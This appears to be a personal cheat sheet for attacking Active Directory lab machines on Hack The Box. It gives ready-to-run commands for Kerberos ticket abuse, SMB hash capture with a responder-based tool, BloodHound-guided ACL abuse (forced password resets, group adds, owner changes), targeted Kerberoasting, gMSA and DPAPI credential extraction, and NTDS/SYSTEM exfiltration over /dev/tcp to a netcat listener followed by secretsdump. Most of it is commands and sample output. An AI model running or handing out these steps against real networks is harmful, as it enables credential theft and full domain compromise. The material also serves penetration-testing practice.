I made this to work 10x faster on  [Active Directory](../../3%20-%20Tags/Hacking%20Concepts/Active%20Directory.md) boxes.
## Interesting ports from scan

```bash
53: DNS Most of the time not the way in, maybe enum   
88: Kerberos - Maybe Kerbrute but not much to go into
135/139/445: 'SMB'  Always interesting !!
3389: RDP  Always stands out, worth checking
```

Add domain name from nmap to `/etc/hosts`
## Ticket Requests

If gives you password but don't work:
```bash
└─$ impacket-getTGT machine.htb/'user,name':'passwd'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in user.name.ccache

$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Machine/user/tickets/user.name.ccache   # IMPORTANT

$ nxc ldap machine.htb -u user.name -p passwd -k
LDAP        machine.htb      389    DC               [*] None (name:DC) (domain:machine.htb)
LDAP        machine.htb      389    DC               [+] machine.htb\user.name:passwd  
```

Now collect with [Bloodhound](../../3%20-%20Tags/Hacking%20Tools/Bloodhound.md).
## SMB (135,139,445) Enumeration

Can i find creds, write, steal with links?

Anonymous access? `netexec` or [SMBclient](../../3%20-%20Tags/Hacking%20Tools/SMBclient.md) or [SMBmap](../../3%20-%20Tags/Hacking%20Tools/SMBmap.md) 

```bash
smbclient -L \\\\domain.name\\

smbclient -L \\\\domain.name\\ -U user # If you have creds
```

OR
```bash
nxc smb dc.domain.htb -u user.name -p 'passwd' -k --shares --smb-timeout 500   # -k is for ticket usage

impacket-smbclient -k dc.machine.htb # To connect usage: shares, use share, ls, cd, get  
```

if list the shares then yes. Can connect?

```bash
smbclient \\\\domain.name\\Share # -U user -p passwd
```

If can write steal creds with `responder`

To steal use https://github.com/overgrowncarrot1/SMBKiller

```bash
python3 SMB_Killer.py -r Victim_IP -l MY_IP -d domain.name -i tun0 -a Share -U 'blankforanon' -p passwd?    
```

The tool starts an automatic responder instance to capture the hashes.

Crack with [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) or [Hashcat](../../3%20-%20Tags/Hacking%20Tools/Hashcat.md)

Verify user:

```bash
nxc smb domain.name -u 'user.name' -p 'passwd' --shares
```

## Bloodhound

Collect with [Bloodhound](../../3%20-%20Tags/Hacking%20Tools/Bloodhound.md):

```bash
 bloodhound-python -u 'user' -p 'passwd' -d domain.htb -ns 10.10.11.xx -c All --zip # -p or --hashes
```

Checks
```bash
'OUTBOUND OBJECT CONTROL'
'GROUPS' # like RemoteManager (WinRM)
```

Stands out
```bash
GenericAll: changepasswd and ownaccount # You can do everything with GA - BloodyAD
WriteSPN: can create a fake `SPN` of `user2` and get and hash to crack ## TargetedKerberoast tool
AddSelf: Add user to group # BloodyAD tool
ReadGMSAPassword: Reads any gMSA password blobs the user can access # GMSADumper tool
ForceChangePassword: modify directly # BloodyAD
WriteOwner: Change password # Impacket-owneredit then BloodyAD
```

## Evil-WinRM

```bash
evil-winrm -u 'user.name' -p 'passwd' -i dc.machine.htb # -H for hashes

evil-winrm -i dc.domain.htb -k userticket.ccache -r REALM.htb  # with ticket auth, add REALM in krb5 config if needed
```

## TargetedKerberoast


**WriteSPN**
```bash
┌──(.venv)─(mdn0x㉿mdn0xKali)
└─$ python3 targetedKerberoast.py -v -d domain.htb -u user -p 'passwd'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (user2)
[+] Printing hash for (user2)
$krb5tgs$23$*user2$DOMAIN.HTB$machine.htb/User2*$0e83983aba480c3219b96987f20b128e$f66d93f0d55de1da3610267d601fe46a3eed827e3348ff764eca454ff3067429352018f988e71b0bca4636df36765f69664d77acdd4080b34d70ead2abbd2f52bb82054cd69f7f75475ee9beb93b06d036d6b24c8ace08ce04aac9cba49a6b8311fa66eb35ed80222cd23fc328ba489d2d9e83c47f9d0d1982b<SNIP>
[VERBOSE] SPN removed successfully for (user)
```

## BloodyAD

**AddSelf**
```bash
┌──(mdn0x㉿mdn0xKali)
└─$ bloodyAD --host '10.10.11.xx' -d 'domain.htb' -u user -p 'passwd' add groupMember GROUP user
[+] user added to GROUP
```


**ForceChangePassword - GenericAll**
```bash
└─$ bloodyAD --host '10.10.11.xx' -d 'domain.htb' -u 'user' -p 'passwd' set password USER2 'Hacker123!' # hash with -p also
[+] Password changed successfully!
```

## GMSADumper

**ReadGMSAPasswords**
```bash
└─$ python gMSADumper.py -u user -p passwd -d domain.htb 
```

This give you an usable hash like this`:4f46405647993c7d4e1dc1c25dd6ecf4` 
## Write Owner

First we use `impacket-owneredit` to make `USER` owner of `USER2`:

```bash
└─$ impacket-owneredit -action write -target 'user2' -new-owner 'user' 'machine.htb/user':'Hacker123!' -dc-ip 10.10.11.xx
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=DCname,DC=htb
[*] OwnerSid modified successfully!
```

Now we can change his password with `bloodyAD`. First add `GenericAll`:

```bash
─$ bloodyAD --host 10.10.11.xx -d machine.htb -u 'user' -p 'Hacker123!' add genericAll user2 user
[+] user has now GenericAll on user2
```

Now change password.

## DPAPI

If you can find `dpapi` encrypted data and keys:

``` bash
- get /../../../AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88

- get /../../../AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3
```
### Cracking

crack the key:
```bash
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password Password
```

Crack creds
```bash
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key keyfrommasterkey
```

## Secrets Dump 

If you can find the `SYSTEM` and `NTDS` files grab them, possibly with a listener:

```bash
$ nc -lvnp 4444 > SYSTEM

cat SYSTEM  > /dev/tcp/10.10.xx.xx/4444 # on Target

$ nc -lvnp 4444 > ntds.dit

cat ntds.dit > /dev/tcp/10.10.xx.xx/4444 # on Target
```
### Cracking

Use `Impacket` function to crack the hashes:

```bash
$ impacket-secretsdump -ntds ntds.dit -system SYSTEM local 
```

Request a ticket then use [Evil-WinRM](../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md) with `-k` flag.